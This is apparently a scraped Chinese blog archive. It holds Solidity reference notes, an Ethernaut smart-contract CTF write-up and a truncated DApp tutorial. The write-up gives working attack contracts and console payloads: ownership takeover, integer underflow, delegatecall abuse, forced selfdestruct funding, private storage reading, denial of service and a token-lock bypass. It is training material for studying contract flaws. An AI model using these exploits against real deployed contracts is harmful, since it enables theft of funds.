suicide(address recipient)：与 selfdestruct 等价，但已不推荐使用 &lt;address&gt;.balance （uint256）： 地址类型 的余额，以 Wei 为单位 &lt;address&gt;.send(uint256 amount) returns (bool)：向 地址类型 发送给定数量的 Wei，失败时返回 false &lt;address&gt;.transfer(uint256 amount)：向 地址类型 发送给定数量的 Wei，失败时会把错误抛出（throw） 不要用 block.timestamp、now 或者 blockhash 作为随机种子，除非你明确知道你在做什么。 时间戳和区块哈希都可以在一定程度上被矿工所影响。如果你用哈希值作为随机种子，那么例如挖矿团体中的坏人就可以使用给定的哈希来执行一个赌场功能，如果他们没赢钱，他们可以简单地换一个哈希再试。 当前区块的时间戳必须比前一个区块的时间戳大，但唯一可以确定的就是它会是权威链（主链或者主分支）上两个连续区块时间戳之间的一个数值。 出于扩展性的原因，你无法取得所有区块的哈希。只有最新的 256 个区块的哈希可以拿到，其他的都将为 0。 保留字(Reserved Keywords) 以下是 Solidity 的保留字，未来可能会变为语法的一部分： 1abstract, after, alias, apply, auto, case, catch, copyof, default, define, final, immutable, implements, in, inline, let, macro, match, mutable, null, of, override, partial, promise, reference, relocatable, sealed, sizeof, static, supports, switch, try, type, typedef, typeof, unchecked. 语法表(Language Grammar) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181SourceUnit = (PragmaDirective | ImportDirective | ContractDefinition)*// Pragma actually parses anything up to the trailing &apos;;&apos; to be fully forward-compatible.PragmaDirective = &apos;pragma&apos; Identifier ([^;]+) &apos;;&apos;ImportDirective = &apos;import&apos; StringLiteral (&apos;as&apos; Identifier)? &apos;;&apos; | &apos;import&apos; (&apos;*&apos; | Identifier) (&apos;as&apos; Identifier)? &apos;from&apos; StringLiteral &apos;;&apos; | &apos;import&apos; &apos;&#123;&apos; Identifier (&apos;as&apos; Identifier)? ( &apos;,&apos; Identifier (&apos;as&apos; Identifier)? )* &apos;&#125;&apos; &apos;from&apos; StringLiteral &apos;;&apos;ContractDefinition = ( &apos;contract&apos; | &apos;library&apos; | &apos;interface&apos; ) Identifier ( &apos;is&apos; InheritanceSpecifier (&apos;,&apos; InheritanceSpecifier )* )? &apos;&#123;&apos; ContractPart* &apos;&#125;&apos;ContractPart = StateVariableDeclaration | UsingForDeclaration | StructDefinition | ModifierDefinition | FunctionDefinition | EventDefinition | EnumDefinitionInheritanceSpecifier = UserDefinedTypeName ( &apos;(&apos; Expression ( &apos;,&apos; Expression )* &apos;)&apos; )?StateVariableDeclaration = TypeName ( &apos;public&apos; | &apos;internal&apos; | &apos;private&apos; | &apos;constant&apos; )* Identifier (&apos;=&apos; Expression)? &apos;;&apos;UsingForDeclaration = &apos;using&apos; Identifier &apos;for&apos; (&apos;*&apos; | TypeName) &apos;;&apos;StructDefinition = &apos;struct&apos; Identifier &apos;&#123;&apos; ( VariableDeclaration &apos;;&apos; (VariableDeclaration &apos;;&apos;)* ) &apos;&#125;&apos;ModifierDefinition = &apos;modifier&apos; Identifier ParameterList? BlockModifierInvocation = Identifier ( &apos;(&apos; ExpressionList? &apos;)&apos; )?FunctionDefinition = &apos;function&apos; Identifier? ParameterList ( ModifierInvocation | StateMutability | &apos;external&apos; | &apos;public&apos; | &apos;internal&apos; | &apos;private&apos; )* ( &apos;returns&apos; ParameterList )? ( &apos;;&apos; | Block )EventDefinition = &apos;event&apos; Identifier EventParameterList &apos;anonymous&apos;? &apos;;&apos;EnumValue = IdentifierEnumDefinition = &apos;enum&apos; Identifier &apos;&#123;&apos; EnumValue? (&apos;,&apos; EnumValue)* &apos;&#125;&apos;ParameterList = &apos;(&apos; ( Parameter (&apos;,&apos; Parameter)* )? &apos;)&apos;Parameter = TypeName StorageLocation? Identifier?EventParameterList = &apos;(&apos; ( EventParameter (&apos;,&apos; EventParameter )* )? &apos;)&apos;EventParameter = TypeName &apos;indexed&apos;? Identifier?FunctionTypeParameterList = &apos;(&apos; ( FunctionTypeParameter (&apos;,&apos; FunctionTypeParameter )* )? &apos;)&apos;FunctionTypeParameter = TypeName StorageLocation?// semantic restriction: mappings and structs (recursively) containing mappings// are not allowed in argument listsVariableDeclaration = TypeName StorageLocation? IdentifierTypeName = ElementaryTypeName | UserDefinedTypeName | Mapping | ArrayTypeName | FunctionTypeName | ( &apos;address&apos; &apos;payable&apos; )UserDefinedTypeName = Identifier ( &apos;.&apos; Identifier )*Mapping = &apos;mapping&apos; &apos;(&apos; ElementaryTypeName &apos;=&gt;&apos; TypeName &apos;)&apos;ArrayTypeName = TypeName &apos;[&apos; Expression? &apos;]&apos;FunctionTypeName = &apos;function&apos; FunctionTypeParameterList ( &apos;internal&apos; | &apos;external&apos; | StateMutability )* ( &apos;returns&apos; FunctionTypeParameterList )?StorageLocation = &apos;memory&apos; | &apos;storage&apos; | &apos;calldata&apos;StateMutability = &apos;pure&apos; | &apos;view&apos; | &apos;payable&apos;Block = &apos;&#123;&apos; Statement* &apos;&#125;&apos;Statement = IfStatement | WhileStatement | ForStatement | Block | InlineAssemblyStatement | ( DoWhileStatement | PlaceholderStatement | Continue | Break | Return | Throw | EmitStatement | SimpleStatement ) &apos;;&apos;ExpressionStatement = ExpressionIfStatement = &apos;if&apos; &apos;(&apos; Expression &apos;)&apos; Statement ( &apos;else&apos; Statement )?WhileStatement = &apos;while&apos; &apos;(&apos; Expression &apos;)&apos; StatementPlaceholderStatement = &apos;_&apos;SimpleStatement = VariableDefinition | ExpressionStatementForStatement = &apos;for&apos; &apos;(&apos; (SimpleStatement)? &apos;;&apos; (Expression)? &apos;;&apos; (ExpressionStatement)? &apos;)&apos; StatementInlineAssemblyStatement = &apos;assembly&apos; StringLiteral? AssemblyBlockDoWhileStatement = &apos;do&apos; Statement &apos;while&apos; &apos;(&apos; Expression &apos;)&apos;Continue = &apos;continue&apos;Break = &apos;break&apos;Return = &apos;return&apos; Expression?Throw = &apos;throw&apos;EmitStatement = &apos;emit&apos; FunctionCallVariableDefinition = (VariableDeclaration | &apos;(&apos; VariableDeclaration? (&apos;,&apos; VariableDeclaration? )* &apos;)&apos; ) ( &apos;=&apos; Expression )?// Precedence by order (see github.com/ethereum/solidity/pull/732)Expression = Expression (&apos;++&apos; | &apos;--&apos;) | NewExpression | IndexAccess | MemberAccess | FunctionCall | &apos;(&apos; Expression &apos;)&apos; | (&apos;!&apos; | &apos;~&apos; | &apos;delete&apos; | &apos;++&apos; | &apos;--&apos; | &apos;+&apos; | &apos;-&apos;) Expression | Expression &apos;**&apos; Expression | Expression (&apos;*&apos; | &apos;/&apos; | &apos;%&apos;) Expression | Expression (&apos;+&apos; | &apos;-&apos;) Expression | Expression (&apos;&lt;&lt;&apos; | &apos;&gt;&gt;&apos;) Expression | Expression &apos;&amp;&apos; Expression | Expression &apos;^&apos; Expression | Expression &apos;|&apos; Expression | Expression (&apos;&lt;&apos; | &apos;&gt;&apos; | &apos;&lt;=&apos; | &apos;&gt;=&apos;) Expression | Expression (&apos;==&apos; | &apos;!=&apos;) Expression | Expression &apos;&amp;&amp;&apos; Expression | Expression &apos;||&apos; Expression | Expression &apos;?&apos; Expression &apos;:&apos; Expression | Expression (&apos;=&apos; | &apos;|=&apos; | &apos;^=&apos; | &apos;&amp;=&apos; | &apos;&lt;&lt;=&apos; | &apos;&gt;&gt;=&apos; | &apos;+=&apos; | &apos;-=&apos; | &apos;*=&apos; | &apos;/=&apos; | &apos;%=&apos;) Expression | PrimaryExpressionPrimaryExpression = BooleanLiteral | NumberLiteral | HexLiteral | StringLiteral | TupleExpression | Identifier | ElementaryTypeNameExpressionExpressionList = Expression ( &apos;,&apos; Expression )*NameValueList = Identifier &apos;:&apos; Expression ( &apos;,&apos; Identifier &apos;:&apos; Expression )*FunctionCall = Expression &apos;(&apos; FunctionCallArguments &apos;)&apos;FunctionCallArguments = &apos;&#123;&apos; NameValueList? &apos;&#125;&apos; | ExpressionList?NewExpression = &apos;new&apos; TypeNameMemberAccess = Expression &apos;.&apos; IdentifierIndexAccess = Expression &apos;[&apos; Expression? &apos;]&apos;BooleanLiteral = &apos;true&apos; | &apos;false&apos;NumberLiteral = ( HexNumber | DecimalNumber ) (&apos; &apos; NumberUnit)?NumberUnit = &apos;wei&apos; | &apos;szabo&apos; | &apos;finney&apos; | &apos;ether&apos; | &apos;seconds&apos; | &apos;minutes&apos; | &apos;hours&apos; | &apos;days&apos; | &apos;weeks&apos; | &apos;years&apos;HexLiteral = &apos;hex&apos; (&apos;&quot;&apos; ([0-9a-fA-F]&#123;2&#125;)* &apos;&quot;&apos; | &apos;\&apos;&apos; ([0-9a-fA-F]&#123;2&#125;)* &apos;\&apos;&apos;)StringLiteral = &apos;&quot;&apos; ([^&quot;\r\n\\] | &apos;\\&apos; .)* &apos;&quot;&apos;Identifier = [a-zA-Z_$] [a-zA-Z_$0-9]*HexNumber = &apos;0x&apos; [0-9a-fA-F]+DecimalNumber = [0-9]+ ( &apos;.&apos; [0-9]* )? ( [eE] [0-9]+ )?TupleExpression = &apos;(&apos; ( Expression? ( &apos;,&apos; Expression? )* )? &apos;)&apos; | &apos;[&apos; ( Expression ( &apos;,&apos; Expression )* )? &apos;]&apos;ElementaryTypeNameExpression = ElementaryTypeNameElementaryTypeName = &apos;address&apos; | &apos;bool&apos; | &apos;string&apos; | Int | Uint | Byte | Fixed | UfixedInt = &apos;int&apos; | &apos;int8&apos; | &apos;int16&apos; | &apos;int24&apos; | &apos;int32&apos; | &apos;int40&apos; | &apos;int48&apos; | &apos;int56&apos; | &apos;int64&apos; | &apos;int72&apos; | &apos;int80&apos; | &apos;int88&apos; | &apos;int96&apos; | &apos;int104&apos; | &apos;int112&apos; | &apos;int120&apos; | &apos;int128&apos; | &apos;int136&apos; | &apos;int144&apos; | &apos;int152&apos; | &apos;int160&apos; | &apos;int168&apos; | &apos;int176&apos; | &apos;int184&apos; | &apos;int192&apos; | &apos;int200&apos; | &apos;int208&apos; | &apos;int216&apos; | &apos;int224&apos; | &apos;int232&apos; | &apos;int240&apos; | &apos;int248&apos; | &apos;int256&apos;Uint = &apos;uint&apos; | &apos;uint8&apos; | &apos;uint16&apos; | &apos;uint24&apos; | &apos;uint32&apos; | &apos;uint40&apos; | &apos;uint48&apos; | &apos;uint56&apos; | &apos;uint64&apos; | &apos;uint72&apos; | &apos;uint80&apos; | &apos;uint88&apos; | &apos;uint96&apos; | &apos;uint104&apos; | &apos;uint112&apos; | &apos;uint120&apos; | &apos;uint128&apos; | &apos;uint136&apos; | &apos;uint144&apos; | &apos;uint152&apos; | &apos;uint160&apos; | &apos;uint168&apos; | &apos;uint176&apos; | &apos;uint184&apos; | &apos;uint192&apos; | &apos;uint200&apos; | &apos;uint208&apos; | &apos;uint216&apos; | &apos;uint224&apos; | &apos;uint232&apos; | &apos;uint240&apos; | &apos;uint248&apos; | &apos;uint256&apos;Byte = &apos;byte&apos; | &apos;bytes&apos; | &apos;bytes1&apos; | &apos;bytes2&apos; | &apos;bytes3&apos; | &apos;bytes4&apos; | &apos;bytes5&apos; | &apos;bytes6&apos; | &apos;bytes7&apos; | &apos;bytes8&apos; | &apos;bytes9&apos; | &apos;bytes10&apos; | &apos;bytes11&apos; | &apos;bytes12&apos; | &apos;bytes13&apos; | &apos;bytes14&apos; | &apos;bytes15&apos; | &apos;bytes16&apos; | &apos;bytes17&apos; | &apos;bytes18&apos; | &apos;bytes19&apos; | &apos;bytes20&apos; | &apos;bytes21&apos; | &apos;bytes22&apos; | &apos;bytes23&apos; | &apos;bytes24&apos; | &apos;bytes25&apos; | &apos;bytes26&apos; | &apos;bytes27&apos; | &apos;bytes28&apos; | &apos;bytes29&apos; | &apos;bytes30&apos; | &apos;bytes31&apos; | &apos;bytes32&apos;Fixed = &apos;fixed&apos; | ( &apos;fixed&apos; [0-9]+ &apos;x&apos; [0-9]+ )Ufixed = &apos;ufixed&apos; | ( &apos;ufixed&apos; [0-9]+ &apos;x&apos; [0-9]+ )AssemblyBlock = &apos;&#123;&apos; AssemblyStatement* &apos;&#125;&apos;AssemblyStatement = AssemblyBlock | AssemblyFunctionDefinition | AssemblyVariableDeclaration | AssemblyAssignment | AssemblyIf | AssemblyExpression | AssemblySwitch | AssemblyForLoop | AssemblyBreakContinueAssemblyFunctionDefinition = &apos;function&apos; Identifier &apos;(&apos; AssemblyIdentifierList? &apos;)&apos; ( &apos;-&gt;&apos; AssemblyIdentifierList )? AssemblyBlockAssemblyVariableDeclaration = &apos;let&apos; AssemblyIdentifierList ( &apos;:=&apos; AssemblyExpression )?AssemblyAssignment = AssemblyIdentifierList &apos;:=&apos; AssemblyExpressionAssemblyExpression = AssemblyFunctionCall | Identifier | LiteralAssemblyIf = &apos;if&apos; AssemblyExpression AssemblyBlockAssemblySwitch = &apos;switch&apos; AssemblyExpression ( Case+ AssemblyDefault? | AssemblyDefault )AssemblyCase = &apos;case&apos; Literal AssemblyBlockAssemblyDefault = &apos;default&apos; AssemblyBlockAssemblyForLoop = &apos;for&apos; AssemblyBlock AssemblyExpression AssemblyBlock AssemblyBlockAssemblyBreakContinue = &apos;break&apos; | &apos;continue&apos;AssemblyFunctionCall = Identifier &apos;(&apos; ( AssemblyExpression ( &apos;,&apos; AssemblyExpression )* )? &apos;)&apos;AssemblyIdentifierList = Identifier ( &apos;,&apos; Identifier )*]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut WriteUp]]></title>
    <url>%2F2019%2F03%2F26%2FEthernaut-writeUp%2F</url>
    <content type="text"><![CDATA[很好玩的合约游戏 1. Fallback Target: claim ownership of the contract &emsp;&emsp;这道题是考察fallback函数的奇妙(sb)用法，他的目的应该是处理异常用的，但是效果其实有点鸡肋… 123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; owner.transfer(this.balance); &#125; function() payable public &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; &emsp;&emsp;在这里，我们只需要 我 秦始皇 打钱 就可以实现fallback()的调用： contract.sendTransaction({value:1}); &emsp;&emsp;智能合约的梗是真他喵的多 哈哈哈哈哈 2. Fallout Target: Claim ownership of the contract &emsp;&emsp;这道题的出题人是真的欠揍，马德，完全是考眼力： 12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; &emsp;&emsp;看到没有第9行正儿八经的写着constructor 喵？定睛一看构造个瓜皮的函数，Fal1out() 这里不要被骗了，直接调用就可以了。 contract.Fal1out(); 3. Coin Flip 4. Telephone Target: 将owner变为自己 &emsp;&emsp;本题主要考察的是只能合约中tx.origin与msg.sender的区别，tx.origin是交易发起人，msg.sender是合约的上层调用地址。因此只需要用新合约包装一下地址就好了。 1234567891011121314151617181920212223242526pragma solidity &gt;=0.4.0 &lt; 0.6.0;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract attack&#123; address target = 0x811cb74F2FC520c64f7B44ac90d056c744f0Cf4d; Telephone c = Telephone(target); function hit() public&#123; Telephone c = Telephone(target); c.changeOwner(msg.sender); &#125;&#125; 5. Token Target: 将owner变为自己 &emsp;&emsp;这里主要考察uint的无符号整数的下溢,当uint为负数时，根据二进制的无符号表示法，此时数会变成一个极大的数，比如: 123uint a = 1;a = a - 2; //此时a为ffffffff &emsp;&emsp;这在pwn中十分常见，因此我们可以构造payload，即: contract.transfer(yourAddress,21); &emsp;&emsp;或者构造攻击合约：12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125;contract attack&#123; address Tokens = 0x0c65c7ec30d5d856958707fc8b958302ae689b49; Token target = Token(Tokens); function hit() public &#123; target.transfer(msg.sender,21); &#125;&#125; 6. Delegation Target: 将owner变为自己 &emsp;&emsp;这道题主要考察的是delegatecall()相关的知识，delegatecall() 与 call() 的区别是两者的上下文不同，delegatecall()的上下文是调用方，而call()函数的上下文则是实例本身。 &emsp;&emsp;我们来看一下合约代码： 12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; if(delegate.delegatecall(msg.data)) &#123; this; &#125; &#125;&#125; &emsp;&emsp;我们可以看到Delegation的fallback函数中存在delegatecall而且其中的参数可以修改，这个时候我们可以直接调用Delegate实例的pwn()函数，payload如下： contract.sendTransaction({data:web3.sha3(“pwn()”)}) &emsp;&emsp;这个时候我们可以看到实例直接调用了非public的pwn函数,我们就实现了修改owner的操作。 7. Force&emsp;&emsp;这一题是要你给这个合约转钱，这里除了一只噬元兽什么也没有…乍一看挺懵逼的 1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m) //马德 为什么这个猫变形了...*/&#125; &emsp;&emsp;要想给一个地址强行转钱，我们可以让一个合约自杀，然后钱就会被强行转入别的账户而且不能拒绝。所以我们就可以写个合约，随便打点钱，然后让他当场暴毙…好生刺激。 12345678910111213pragma solidity ^0.4.18;contract Force&#123;&#125;contract payload&#123; function payload() payable&#123;&#125; address addr_force = 0x0ad6047bf65c599bf68fbbc0372c3923280f2a66; function hit() public &#123; selfdestruct(addr_force); &#125;&#125; &emsp;&emsp;这样一来，一执行hit()函数payload就凉凉，然后钱就打到了Force里面了，有没有一种舔狗的感觉… 8. Vault Target: 解锁 &emsp;&emsp;这道题主要考察了如何通过web3的web3.eth.getStorageAt()接口来查看区块上的信息。 1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; &emsp;&emsp;我们只需要通过unlock()函数就能修改locked的值，getStorageAt()的用法如下： web3.eth.getStorageAt(addressHexString, position [, defaultBlock] [, callback]) &emsp;&emsp;我们需要使用一个回调函数来打印出相关数据： 1234web3.eth.getStorageAt(contract.address,1,function(x,y)&#123; var result = web3.toAscii(y); alert(result); &#125;); 9. King Target: Be a king forever!! &emsp;&emsp;先放源码： 123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; &emsp;&emsp;这个题目有点坑爹，他原本的目的是让你进行一次ddos攻击,在之前的版本中，我们可以使用123451. require()2. revert()3. assert() &emsp;&emsp;这三个函数主动抛出错误，这样一样就可以阻止transfer()的进行，但是在实施的时候我们发现这三个函数并没有阻止交易的进行，所以我们决定直接放弃编写fallback()从而进行拒绝服务攻击。 123456789contract fuck&#123; function fuck() payable&#123; address king_addr = 0xc48b3899a3a594b170404855De1B0bDA2d0aec1c; king_addr.call.value(1.01 ether)(); &#125; function gg() public&#123; selfdestruct(msg.sender); &#125;&#125; gg()完全是为了以防钱提不出来，留个后手。 15.Naught Coin Target:取出合约中player所对应的balances &emsp;&emsp;这里的balances实际上是一个token，作者重写了transfer()方法，但是他的源码不见了，我在github上找到了之前的版本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586pragma solidity ^0.4.24;import "./BasicToken.sol";import "./ERC20.sol";/** * @title Standard ERC20 token * * @dev Implementation of the basic standard token. * https://github.com/ethereum/EIPs/issues/20 * Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol */contract StandardToken is ERC20, BasicToken &#123; mapping (address =&gt; mapping (address =&gt; uint256)) internal allowed; /** * @dev Transfer tokens from one address to another * @param _from address The address which you want to send tokens from * @param _to address The address which you want to transfer to * @param _value uint256 the amount of tokens to be transferred */ function transferFrom( address _from, address _to, uint256 _value ) public returns (bool) &#123; require(_value &lt;= balances[_from]); require(_value &lt;= allowed[_from][msg.sender]); require(_to != address(0)); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; &#125; /** * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender. * Beware that changing an allowance with this method brings the risk that someone may use both the old * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 * @param _spender The address which will spend the funds. * @param _value The amount of tokens to be spent. */ function approve(address _spender, uint256 _value) public returns (bool) &#123; allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; &#125; /** * @dev Function to check the amount of tokens that an owner allowed to a spender. * @param _owner address The address which owns the funds. * @param _spender address The address which will spend the funds. * @return A uint256 specifying the amount of tokens still available for the spender. */ function allowance( address _owner, address _spender ) public view returns (uint256) &#123; return allowed[_owner][_spender]; &#125; /** * @dev Increase the amount of tokens that an owner allowed to a spender. * approve should be called when allowed[_spender] == 0. To increment * allowed value is better to use this function to avoid 2 calls (and wait until * the first transaction is mined) * From MonolithDAO Token.sol * @param _spender The address which will spend the funds. * @param _addedValue The amount of tokens to increase the allowance by. */ &#125; &emsp;&emsp;这里我们可以看到transcationFrom()方法并没有被重写，因此我们可以直接调用，但是需要授权。 &emsp;&emsp;接下来看一下题目代码： 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'; contract NaughtCoin is StandardToken &#123; string public constant name = 'NaughtCoin'; string public constant symbol = '0x0'; uint public constant decimals = 18; uint public timeLock = now + 10 years; uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals); address public player; function NaughtCoin(address _player) public &#123; player = _player; totalSupply_ = INITIAL_SUPPLY; balances[player] = INITIAL_SUPPLY; Transfer(0x0, player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) lockTokens public returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(now &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; &emsp;&emsp;这里我们可以看到合约只重写了transfer()函数，这里的balances并不是Ether，而是一种token，因此我们只需要给自己授权，然后吧token转给一个账户就行了。 await contract.approve(player,1000000(1018))await contract.transferFrom(player,instance,1000000*(10**18)); &emsp;&emsp;这样以来我们就吧token全部转出了。]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DAPP开发记录]]></title>
    <url>%2F2019%2F03%2F19%2FDAPP%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[DAPP的简单原理 &emsp;&emsp;DAPP实在是神奇，理解他的工作原理还是需要熟悉区块链的运作方式，在此记录一下我的心路历程。 后端在哪&emsp;&emsp;每次一想到应用开发就觉得需要前后端的配合，后端总得在一台机器上吧，要不然我咋访问，咋交互？但是DAPP就不是这样，我们似乎只能访问其中的节点，以以太坊为例，每一个参与活动的客户端同时又是一个节点，我们自然可以在本地建立轻节点或者全节点，甚至是测试链，由于贫穷，我们在开发调试时就在测试链上进行。 &emsp;&emsp;那么所谓的后端实际上是整个区块链，当合约被部署到区块链上时，整个区块链将成为他的数据库，我们将数据称之为负载，将代码称之为合约。合约之所以称之为合约是因为其不可篡改性以及调用时需要付出代价，即gas。gas可由eth(以太币)进行兑换，gas将用于奖励确认交易的矿工。这里需要注意，所谓交易的确认不过是新的区块的生成，可能有多个交易被打包在一个区块内，由于去中心化所导致的节点间完全不信任，但是新的区块总需要有个人进行确认，这时，就需要引入一种限制方式，或者说证明自己不是 骗子 的条件，即工作量证明(Proof of Work)。你如果要添加一个新的区块，你就要付出工作量的代价，因此就会有挖矿这么一说。 &emsp;&emsp;当然，以上只是简单解释，其中的数学问题相当复杂，比如拜占庭将军问题的处理，等等。而且证明方式也不只是 Proof of work 这么一种。 合约在哪&emsp;&emsp;当你理解了上面的原理之后，这个问题其实很简单，合约自然是在整个区块链上。在remix中进行deploy时，此合约就已经被添加到了区块中，我们在等待区块被确认后，我们通过 ABI(Application Binary Interface),即应用二进制接口和合约的地址来进行调用。没错，合约本身就是一个地址，也是一个账户，当调用它是要给它冲钱。这个时候我们将数据参数发送至某个节点，在EVM运行合约并处理数据后，可能会将数据添加到链上做数据负载，或者将一些负载返回给客户端。我们也可以调用合约的接口来访问visable的状态变量，以面向对象的思想进行思考总是会得到新的体验，这就是设计模式的魅力所在。 开始构建&emsp;&emsp;在做了一部分背景介绍后，我们来进行开发，所需工具如下： remix-ide MetaMask geth lite-server 合约的部署 &emsp;&emsp;首先我们使用remix-ide，我个人建议本地安装，去github上下载。接下来我们将合约进行编译，目前的通用版本是0.5.5,这里Environment应该选择Injected Web3。开发的环境选择Ropsten测试链，因为在这条链上我们可以免费获得eth，实在是穷人啊！至于如何获得免费的以太币我们最后再讲。总的设置如下： &emsp;&emsp;合约会自动编译，接下来我们将合约部署到区块链上，点击下面的deploy： &emsp;&emsp;会出现MetaMask的弹框，让你确认是否进行交易，我们可以看到虽然没有向合约支付，但是却要为矿工支付gas。接下来我们等待一段时间后可以看到交易被确认： 12345678910111213141516pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract human&#123; uint age; string name = &quot;dyf&quot;; function setInfo(uint256 _age, string memory _name) public &#123; age =_age; name = _name; &#125; function getInfo() public view returns(uint256,string memory )&#123; return (age,name); &#125;&#125; &emsp;&emsp; 请注意这里函数的view &emsp;&emsp;以上是我的交易记录，到这里我们的合约已经部署完毕。下一步是在前端引用合约。 合约的调用 &emsp;&emsp;在html中，要实现与区块链的交互我们还是需要Web3的api，就像geth一样，只是被迁移到了前端，这里给出api库： 1&lt;script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"&gt;&lt;/script&gt; &emsp;&emsp;有时间还得读读他的文档，为了方便起见我们最好使用jQuery库，我觉得挺舒服的，直接给出前端代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;html&gt; &lt;head&gt; &lt;script src="https://code.jquery.com/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"&gt;&lt;/script&gt; &lt;meta charset=utf-8&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;my dapp&lt;/h1&gt; &lt;div class="container"&gt; &lt;h3 id='info'&gt;info&lt;/h3&gt; &lt;label&gt;name:&lt;/label&gt; &lt;input type="text" id="name"&gt; &lt;label&gt;age:&lt;/label&gt; &lt;input type="text" id="age"&gt; &lt;button id="button"&gt;Go&lt;/button&gt; &lt;button id="get"&gt; Get info&lt;/button&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; console.log("web3"+web3); if(typeof web3 != 'undifined')&#123; web3 = new Web3(web3.currentProvider); &#125; else&#123; web3 = new Web3(new Web3.providers.HttpProvide("http://localhost:8545")); &#125; var infoContract = web3.eth.contract( [ &#123; "constant": true, "inputs": [], "name": "getInfo", "outputs": [ &#123; "name": "", "type": "uint256" &#125;, &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_age", "type": "uint256" &#125;, &#123; "name": "_name", "type": "string" &#125; ], "name": "setInfo", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;] ) var info = infoContract.at('0x3d2f4d5eb88848e75c966118c98f4928aa188f21'); $("#button").click(function()&#123; var name = $("#name").val(); var age = $("#age").val() info.setInfo(age,name,function(error,result)&#123; if(!error)&#123; console.log("ok"); &#125; &#125;) &#125;) $('#get').click(function()&#123; 